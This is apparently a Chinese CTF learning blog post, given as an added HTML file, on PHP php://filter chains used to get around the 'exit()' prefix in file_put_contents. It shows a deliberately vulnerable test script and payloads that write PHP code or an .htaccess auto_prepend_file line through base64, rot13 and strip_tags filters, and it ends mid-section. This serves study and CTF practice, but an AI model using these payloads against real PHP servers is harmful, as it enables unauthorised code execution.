@@ -1,0 +1,780 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>Filter Chain learning - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="Filter Chain learning" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ML-hacker.github.io/posts/filter-chain-learning/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-14T14:34:26+08:00" />
+<meta property="article:modified_time" content="2024-04-14T14:34:26+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Filter Chain learning"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/filter-chain-learning/" /><link rel="prev" href="http://ML-hacker.github.io/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Filter Chain learning",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http://ML-hacker.github.io/posts/filter-chain-learning/"
+        },"genre": "posts","keywords": "PHP, 文件包含, RCE","wordcount":  926 ,
+        "url": "http://ML-hacker.github.io/posts/filter-chain-learning/","datePublished": "2024-04-14T14:34:26+08:00","dateModified": "2024-04-14T14:34:26+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Delete"},"author": {
+                "@type": "Person",
+                "name": "Delete"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Filter Chain learning</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;926 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="0x0e前言" class="headerLink">
+    <a href="#0x0e%e5%89%8d%e8%a8%80" class="header-mark"></a>0x0e前言</h1><p>这个filterchain之前已经学过了，但是iconv和死亡杂糅的知识点是分开学的，而且也有一段时间了，所以打算写一篇总结起来学习可能会好一点</p>
+<h1 id="0x01前置知识" class="headerLink">
+    <a href="#0x01%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" class="header-mark"></a>0x01前置知识</h1><h2 id="base64编码与解码" class="headerLink">
+    <a href="#base64%e7%bc%96%e7%a0%81%e4%b8%8e%e8%a7%a3%e7%a0%81" class="header-mark"></a>Base64编码与解码</h2><p>可能刚刚入门CTF的师傅都知道base64是什么东西，但是不知道它的工作原理。
+base64编码字符表如下。
+<figure><img
+        
+        loading="lazy"
+        src="https://pic4.zhimg.com/80/v2-224b071eb2d3236d84c88394c4746e27_1440w.webp"
+        srcset="https://pic4.zhimg.com/80/v2-224b071eb2d3236d84c88394c4746e27_1440w.webp, https://pic4.zhimg.com/80/v2-224b071eb2d3236d84c88394c4746e27_1440w.webp 1.5x, https://pic4.zhimg.com/80/v2-224b071eb2d3236d84c88394c4746e27_1440w.webp 2x"
+        alt="https://pic4.zhimg.com/80/v2-224b071eb2d3236d84c88394c4746e27_1440w.webp"
+        title="https://pic4.zhimg.com/80/v2-224b071eb2d3236d84c88394c4746e27_1440w.webp" ></figure></p>
+<h2 id="encode-process" class="headerLink">
+    <a href="#encode-process" class="header-mark"></a>Encode Process</h2><p><figure><img
+        
+        loading="lazy"
+        src="https://www.freecodecamp.org/news/content/images/2023/11/base64-diagram-smaller-1.png"
+        srcset="https://www.freecodecamp.org/news/content/images/2023/11/base64-diagram-smaller-1.png, https://www.freecodecamp.org/news/content/images/2023/11/base64-diagram-smaller-1.png 1.5x, https://www.freecodecamp.org/news/content/images/2023/11/base64-diagram-smaller-1.png 2x"
+        alt="https://www.freecodecamp.org/news/content/images/2023/11/base64-diagram-smaller-1.png"
+        title="https://www.freecodecamp.org/news/content/images/2023/11/base64-diagram-smaller-1.png" ></figure>
+可以看见对于Sun来编码，首先就是将三个字节拆开来，再组合最后分成8bit进行编码，所以很清楚就能知道base64的编码过程就是不断拆开和组合。并且很清楚看见base64是3个字符3个字符进行编码的，当不足的时候会用<code>=</code>；来补齐
+example:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;Delete&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//=&gt;RGVsZXRl
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;Delet&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//=&gt;RGVsZXQ=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="decode-process" class="headerLink">
+    <a href="#decode-process" class="header-mark"></a>Decode Process</h2><p>那么相反，你就会发现解码过程就是编码的逆运算，但是base64是以4个8bit的数据进行解码并且仅对有效字符进行解码，所以这个地方记住，在后面的知识点需要利用这个知识点.</p>
+<h1 id="0x02死亡杂糅" class="headerLink">
+    <a href="#0x02%e6%ad%bb%e4%ba%a1%e6%9d%82%e7%b3%85" class="header-mark"></a>0x02死亡杂糅</h1><p>三种情况：
+<code>file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</code></p>
+<p><code>file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</code></p>
+<p><code>file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);</code></p>
+<h2 id="第一种文件名和参数可控" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%80%e7%a7%8d%e6%96%87%e4%bb%b6%e5%90%8d%e5%92%8c%e5%8f%82%e6%95%b0%e5%8f%af%e6%8e%a7" class="header-mark"></a>第一种（文件名和参数可控）</h2><h3 id="base64" class="headerLink">
+    <a href="#base64" class="header-mark"></a>base64</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;php://filter/convert.base64decode/resource=delete.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="s1">&#39;aPD9waHAgcGhwaW5mbygpOw==&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在前面加一个a是因为前面的解码的原因，要凑4个字符来
+测试源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&#34;&lt;?php exit();&#34;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>传参：
+http://127.0.0.1/2.php?filename=php://filter/convert.base64-decode/resource=delete.php&amp;content=aPD9waHAgcGhwaW5mbygpOw==
+可以发现
+<figure><img
+        
+        loading="lazy"
+        src="/img/filterchain/1.png"
+        srcset="/img/filterchain/1.png, /img/filterchain/1.png 1.5x, /img/filterchain/1.png 2x"
+        alt="/img/filterchain/1.png"
+        title="/img/filterchain/1.png" ></figure>
+写入成功，如果不补齐的话就会乱码就没办法解析了
+补齐之前为31个字符，补后就是32个刚好是4的倍数，所以可以解析</p>
+<h3 id="rot13" class="headerLink">
+    <a href="#rot13" class="header-mark"></a>rot13</h3><p>这里我先附上转化的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># time : 2024/1/12</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author : DELETE</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="n">upperCase</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span>
+</span></span><span class="line"><span class="cl"><span class="n">lowerCase</span><span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
+</span></span><span class="line"><span class="cl"><span class="n">upperDict</span><span class="o">=</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">lowerDict</span><span class="o">=</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;welcome to decode rot-13!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">inputStr</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;please input what you want to decode</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;please comfirm </span><span class="si">{</span><span class="n">inputStr</span><span class="si">}</span><span class="s2"> is what you want to input if yes input y if not input n&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">flag</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;请确认&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">flag</span><span class="o">==</span><span class="s1">&#39;y&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span><span class="s1">&#39;Y&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="k">break</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">flag</span><span class="o">==</span><span class="s1">&#39;n&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">flag</span><span class="o">==</span><span class="s1">&#39;N&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">inputStr</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;please input what string you want to encode or decode!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;comfir way is illegal&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">break</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">upperCase</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">13</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">upperDict</span><span class="p">[</span><span class="n">upperCase</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">=</span><span class="n">upperCase</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">13</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">upperDict</span><span class="p">[</span><span class="n">upperCase</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">=</span><span class="n">upperCase</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">13</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">lowerCase</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">13</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">lowerDict</span><span class="p">[</span><span class="n">lowerCase</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">=</span><span class="n">lowerCase</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">13</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">lowerDict</span><span class="p">[</span><span class="n">lowerCase</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">=</span><span class="n">lowerCase</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">13</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">inputStr</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">lowerCase</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">lowerDict</span><span class="p">[</span><span class="n">ch</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">	<span class="k">elif</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">upperDict</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">upperDict</span><span class="p">[</span><span class="n">ch</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;final decode result is </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里构造一下编码内容后就是<code>&lt;?cuc  cucvasb();?&gt;</code>
+这里我们直接做playload传
+<figure><img
+        
+        loading="lazy"
+        src="/img/filterchain/2.png"
+        srcset="/img/filterchain/2.png, /img/filterchain/2.png 1.5x, /img/filterchain/2.png 2x"
+        alt="/img/filterchain/2.png"
+        title="/img/filterchain/2.png" ></figure>
+可以看见也是上传了不过这里有个问题就是前面已经有一个标签了所以如果服务器开了短标签，就没办法解析了
+<figure><img
+        
+        loading="lazy"
+        src="/img/filterchain/3.png"
+        srcset="/img/filterchain/3.png, /img/filterchain/3.png 1.5x, /img/filterchain/3.png 2x"
+        alt="/img/filterchain/3.png"
+        title="/img/filterchain/3.png" ></figure></p>
+<h3 id="htaccess预包含" class="headerLink">
+    <a href="#htaccess%e9%a2%84%e5%8c%85%e5%90%ab" class="header-mark"></a>.htaccess预包含</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="err">$</span><span class="n">filename</span><span class="o">=</span><span class="nl">php</span><span class="p">:</span><span class="c1">//filter/write=string.strip_tags/resource=.htaccess
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">$</span><span class="n">content</span><span class="o">=?&gt;</span><span class="n">php_value</span><span class="o">%</span><span class="mi">20</span><span class="n">auto_prepend_file</span><span class="o">%</span><span class="mi">20</span><span class="k">delete</span><span class="p">.</span><span class="n">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意：string.strip_tags在php7.3.0中被弃用了，所以会报错（不过好像phpstudy可以写入)并且注意下尽量在docker起环境，好像phpstudy你传就会500包含不了。
+其实很简单的就能理解，其实就是做了一个文件包含，先闭合了死亡代码后面写入自定义文件
+CTF中可以猜flag的路径从而完成包含，除了可以简单包含，也是可以利用伪协议或者utf-7进行包含</p>
+<h3 id="组合拳" class="headerLink">
+    <a href="#%e7%bb%84%e5%90%88%e6%8b%b3" class="header-mark"></a>组合拳</h3><p>这里就直接贴出来s1mple师傅的一些利用方式不做分析
+1、</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span><span class="o">=</span><span class="s1">&#39;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2、</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$filename</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">zlib</span><span class="o">.</span><span class="nx">deflate</span><span class="o">|</span><span class="nx">string</span><span class="o">.</span><span class="nx">tolower</span><span class="o">|</span><span class="nx">zlib</span><span class="o">.</span><span class="nx">inflate</span><span class="o">|/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">s1mple</span><span class="o">.</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">zlib</span><span class="o">.</span><span class="nx">deflate</span><span class="o">|</span><span class="nx">string</span><span class="o">.</span><span class="nx">tolower</span><span class="o">|</span><span class="nx">zlib</span><span class="o">.</span><span class="nx">inflate</span><span class="o">|</span><span class="cp">?&gt;</span><span class="err">&lt;?php%0dphpinfo();?&gt;/resource=s1mple.php
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第二种共用一个变量" class="headerLink">
+    <a href="#%e7%ac%ac%e4%ba%8c%e7%a7%8d%e5%85%b1%e7%94%a8%e4%b8%80%e4%b8%aa%e5%8f%98%e9%87%8f" class="header-mark"></a>第二种(共用一个变量)</h2><p>首先这里放出s1ample师傅的一种打法
+在php不为7的条件下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">content</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">write</span><span class="o">=</span><span class="nx">string</span><span class="o">.</span><span class="nx">strip_tags</span><span class="o">/</span><span class="cp">?&gt;</span><span class="err">php_value%20auto_prepend_file%20G:\s1mple.php%0a%23/resource=.htaccess
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实也就是写入.htaccess进行预包含和前面的原理是一样的</p>
+<h3 id="关于直接使用base64的思考" class="headerLink">
+    <a href="#%e5%85%b3%e4%ba%8e%e7%9b%b4%e6%8e%a5%e4%bd%bf%e7%94%a8base64%e7%9a%84%e6%80%9d%e8%80%83" class="header-mark"></a>关于直接使用Base64的思考</h3><p>在这个知识点上，很多师傅都没有成功。
+比如Cyc1e师傅写的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span><span class="c1">//filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>s1maple师傅写的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
